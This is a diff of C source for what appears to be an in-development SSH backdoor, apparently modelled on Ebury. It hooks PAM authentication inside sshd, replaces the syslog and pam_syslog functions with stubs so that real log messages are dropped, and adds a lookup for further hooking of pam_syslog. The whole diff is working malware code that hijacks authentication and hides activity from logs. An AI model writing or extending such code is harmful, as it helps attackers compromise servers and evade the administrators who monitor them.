@@ -265,18 +265,35 @@ static int my_pam_auth(struct pam_handle *pamh, int flags)
 }
 
 /*
- *
+ * openssh 6.0p1 and 6.8p1 both use __syslog_chk
  */
 static int my_syslog_chk(int priority, int flag, const char *format)
 {
 	FILE *fp = fopen("/root/asf", "a+");
-	fprintf(fp, "in syslog ayylmao\n");
+	fprintf(fp, "in __syslog_chk ayylmao\n");
 	fflush(fp);
 	fclose(fp);
 
 	return 0;
 }
 
+void my_pam_syslog(pam_handle_t *pamh, int priority, const char *fmt, ...)
+{
+	/*
+	va_list args;
+
+	va_start (args, fmt);
+	pam_vsyslog (pamh, priority, fmt, args);
+	va_end (args);
+	*/
+	FILE *fp = fopen("/root/asd", "a+");
+	fprintf(fp, "in pam_syslog ayylmao\n");
+	fflush(fp);
+	fclose(fp);
+
+
+
+}
 
 
 static void  __attribute__ ((constructor)) init(void)
@@ -333,9 +350,6 @@ static void  __attribute__ ((constructor)) init(void)
 	signal(SIGBUS, SIG_DFL);
 
 
-/*	begin experiments -- fixing PermitRootLogin
-		how the hell did the original Ebury guys do this? */
-
 	/* XXX: all of this crap deserves a wrapper - ? muh modularity */
 
 	void *libcstart = get_libstart(link_map, "libc.so.6");
@@ -373,6 +387,10 @@ static void  __attribute__ ((constructor)) init(void)
 	
 	if (type == RELOC_INFO)
 		hook_rela(foundrela,  my_syslog_chk, type);
+
+
+	/* TODO: hook pam_syslog */
+	void *pam_syslog = find_func_ptr(link_map, pamstart, "pam_syslog");
 
 
 
